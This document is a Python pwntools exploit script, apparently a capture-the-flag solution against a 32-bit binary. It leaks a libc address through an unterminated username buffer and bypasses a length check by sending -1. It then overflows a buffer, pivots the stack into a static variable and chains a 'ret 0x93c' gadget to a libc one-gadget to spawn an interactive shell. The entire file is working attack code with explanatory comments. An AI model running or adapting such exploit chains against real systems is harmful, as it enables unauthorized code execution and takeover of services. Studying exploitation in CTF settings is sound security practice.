#!/usr/bin/env python
import sys
from pwn import *
from time import sleep

if len(sys.argv) == 3:
    r = remote(sys.argv[1], int(sys.argv[2]))
else:
    r = process(sys.argv[1])

LIBC_OFFSET = 0x1b3d60
GADGET_OFFSET = 0x5f7b5
LIBC_RW_OFFSET = 0x1b3000
STACK_FIXER_OFFSET = 0x00104ce9 # ret 0x93c;
STATIC_BUF_ADDRESS = 0x804a043

# receive Enter username
r.recv()
# fill name buffer without terminating 0 byte to leak stack
r.send("a"*0x40)
# read leaked stack
data = r.read()
# get address of stdout (in libc data)
stdout = u32(data[0x44:0x48])
# calc libc base and one gadget
libcbase = stdout - LIBC_OFFSET
gadget = libcbase + GADGET_OFFSET
log.info("libc_base: 0x%x" % (libcbase))
# read Enter length
r.read()
# send length -1 to bypass length check
# since the length is stored in a static variable that is not
# affectd by ASLR, we can store further values which we will later use as 
# stack. the mini-ROP chain starts with the gadet "ret 0x93c;" because 
# otherwise the stack would be too small and the one gadget would 
# crash because it moves the stack to unmapped memory
buf = "-1\x00" + p32(libcbase+STACK_FIXER_OFFSET) + p32(gadget)
r.send(buf.ljust(0x10)) # make sure we fully fill the buffer
# this is the data that overflows the buffer
buf = p32(0xdecafbad)*20 # garbage
buf += p32(STATIC_BUF_ADDRESS+4) # the address of our new stack (static variable)
buf += p32(0x00) # garbage
buf += p32(libcbase + LIBC_RW_OFFSET) # base of libc rw section for one gadget, gets moved to esi
r.send(buf)
r.read()
r.read()
r.interactive()
